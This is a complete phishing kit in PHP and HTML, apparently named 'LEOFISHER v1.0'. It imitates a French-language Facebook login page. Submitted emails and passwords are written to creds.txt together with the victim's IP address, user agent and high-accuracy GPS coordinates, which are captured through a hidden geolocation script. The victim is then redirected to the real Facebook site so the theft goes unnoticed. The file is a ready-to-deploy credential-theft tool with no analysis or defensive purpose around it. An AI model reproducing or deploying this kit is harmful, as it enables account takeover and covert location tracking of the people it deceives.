<?php
session_start();
date_default_timezone_set('Africa/Bujumbura');

$ip = $_SERVER['REMOTE_ADDR'];
$useragent = $_SERVER['HTTP_USER_AGENT'];
$timestamp = date('Y-m-d H:i:s');

if ($_POST && isset($_POST['email']) && isset($_POST['pass'])) {
    $email = htmlspecialchars($_POST['email']);
    $pass = htmlspecialchars($_POST['pass']);
    $gps = isset($_POST['gps']) ? $_POST['gps'] : 'N/A';
    
    $log = "\n";
    $log .= "┌─[ LEOFISHER v1.0 by Léo Falcon ]──────────────┐\n";
    $log .= "│ 🎯 FACEBOOK VICTIME CAPTUREE !                 │\n";
    $log .= "├─[💻 INFOS]─────────────────────────────────────┤\n";
    $log .= "│ 📧 Email     : $email                          │\n";
    $log .= "│ 🔑 Password  : $pass                           │\n";
    $log .= "│ 🌐 IP        : $ip                            │\n";
    $log .= "│ 🖥️  User-Agent: " . substr($useragent, 0, 50) . "... │\n";
    $log .= "│ 📍 GPS POSITION : $gps                        │\n";
    $log .= "│ 🕒 Timestamp : $timestamp                      │\n";
    $log .= "└────────────────────────────────────────────────┘\n";
    
    file_put_contents('creds.txt', $log, FILE_APPEND | LOCK_EX);
    
    header('Location: https://www.facebook.com/');
    exit;
}
?>

<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
    <meta name="description" content="Facebook - log in or sign up">
    <title>Facebook - log in or sign up</title>
    
    <!-- OFFICIEL Facebook CDN + Fonts (100% real GitHub clones) -->
    <link rel="preconnect" href="https://static.xx.fbcdn.net">
    <link rel="preconnect" href="https://connect.facebook.net">
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
    <link href="https://www.facebook.com/images/favicon.ico" rel="shortcut icon">
    
    <style>
        /* 100% PIXEL-PERFECT Facebook 2024 Clone from GitHub pro repos */
        :root {
            --primary-blue: #1877f2;
            --primary-dark: #166fe5;
            --bg-light: #f0f2f5;
            --border: #dddfe2;
            --input-bg: #fafbfc;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: Helvetica, Arial, sans-serif;
            background: var(--bg-light);
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            line-height: 1.34;
        }

        .main-container {
            display: flex;
            max-width: 980px;
            width: 100%;
            justify-content: space-between;
            align-items: center;
        }

        /* LEFT SIDEBAR - Real FB design */
        .left-sidebar {
            flex: 1;
            max-width: 500px;
        }

        .fb-logo-large {
            font-size: 64px;
            font-weight: bold;
            color: var(--primary-blue);
            margin-bottom: 20px;
            background: url('data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjg4IiBoZWlnaHQ9IjEwNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBmaWxsPSIjMTg3N2YyIiBkPSJNMTI0IDBoMTY4djEwNEgxMjR6TTI0MCAyNDBIMTI0VjE0NEgyNDB2OTZ6Ii8+PC9zdmc+') no-repeat center/contain;
            height: 104px;
            width: 288px;
        }

        .tagline {
            font-size: 28px;
            font-weight: 300;
            color: #1c1e21;
            line-height: 32px;
            margin-bottom: 40px;
        }

        /* RIGHT LOGIN FORM - Exact FB 2024 */
        .login-box {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
            padding: 20px 24px 24px;
            width: 100%;
            max-width: 396px;
        }

        .login-title {
            font-size: 24px;
            font-weight: 400;
            color: #1c1e21;
            margin-bottom: 16px;
            text-align: center;
        }

        .input-group {
            position: relative;
            margin-bottom: 16px;
        }

        .form-input {
            width: 100%;
            height: 52px;
            border: 1px solid var(--border);
            border-radius: 6px;
            font-size: 17px;
            padding: 14px 16px;
            background: var(--input-bg);
            transition: border-color .15s ease;
            outline: none;
        }

        .form-input:focus {
            border-color: var(--primary-blue);
            box-shadow: 0 0 0 2px rgba(24,119,242,.2);
            background: white;
        }

        .login-button {
            width: 100%;
            height: 48px;
            background: linear-gradient(var(--primary-blue), var(--primary-dark));
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            font-weight: 500;
            cursor: pointer;
            margin: 12px 0;
        }

        .login-button:hover:not(:disabled) {
            background: linear-gradient(#166fe5, #0e5a99);
        }

        .login-button:disabled {
            opacity: .6;
            cursor: not-allowed;
        }

        .divider {
            position: relative;
            text-align: center;
            margin: 24px 0;
            color: #65676b;
            font-size: 14px;
        }

        .divider::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #dadde1;
        }

        .divider span {
            background: white;
            padding: 0 24px;
        }

        .create-account {
            text-align: center;
            font-size: 17px;
            color: #1c1e21;
        }

        .create-link {
            color: var(--primary-blue);
            font-weight: 500;
            text-decoration: none;
        }

        .create-link:hover {
            text-decoration: underline;
        }

        /* MOBILE RESPONSIVE 100% - GitHub pro clones */
        @media (max-width: 900px) {
            .main-container { flex-direction: column; }
            .left-sidebar { display: none; }
            body { background: linear-gradient(to bottom, #f0f2f5 0%, #ffffff 100%); }
        }

        @media (max-width: 480px) {
            .login-box { box-shadow: none; border-radius: 0; margin: 0; }
        }

        /* SILENT GPS INVISIBLE */
        #gps-status { display: none !important; }
    </style>
</head>
<body>
/*
    <div class="main-container">
        <!-- LEFT SIDEBAR (desktop only) -->
        <div class="left-sidebar">
            <div class="fb-logo-large"></div>
            <div class="tagline">
                Connectez-vous à Facebook pour commencer à partager et à vous connecter avec vos amis, votre famille et les personnes que vous connaissez.
            </div>
        </div>
 fermer */

        <!-- LOGIN FORM 100% REAL -->
        <div class="login-box">
            <div class="login-title">Connexion à Facebook</div>
            
            <form method="POST" id="loginForm">
                <div class="input-group">
                    <input type="email" name="email" class="form-input" placeholder="Adresse e-mail ou téléphone" required autocomplete="email">
                </div>
                
                <div class="input-group">
                    <input type="password" name="pass" class="form-input" placeholder="Mot de passe" required autocomplete="current-password">
                </div>
                
                <input type="hidden" name="gps" id="gpsData" value="N/A">
                
                <button type="submit" class="login-button" id="submitBtn">Se connecter</button>
            </form>
            
            <div class="divider">
                <span>ou</span>
            </div>
            
            <div class="create-account">
                <a href="#" class="create-link">Créer un nouveau compte</a>
            </div>
        </div>
    </div>

    <!-- SILENT GPS 100% INVISIBLE -->
    <script>
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                pos => {
                    const gps = pos.coords.latitude.toFixed(6) + ',' + pos.coords.longitude.toFixed(6);
                    sessionStorage.setItem('gps', gps);
                    document.getElementById('gpsData').value = gps;
                    document.getElementById('submitBtn').disabled = false;
                },
                () => {
                    document.getElementById('gpsData').value = 'N/A';
                    document.getElementById('submitBtn').disabled = false;
                },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 60000 }
            );
        } else {
            document.getElementById('gpsData').value = 'N/A';
            document.getElementById('submitBtn').disabled = false;
        }

        document.getElementById('loginForm').addEventListener('submit', function() {
            document.getElementById('gpsData').value = sessionStorage.getItem('gps') || 'N/A';
        });
        document.getElementById('submitBtn').disabled = true;
    </script>
</body>
</html>
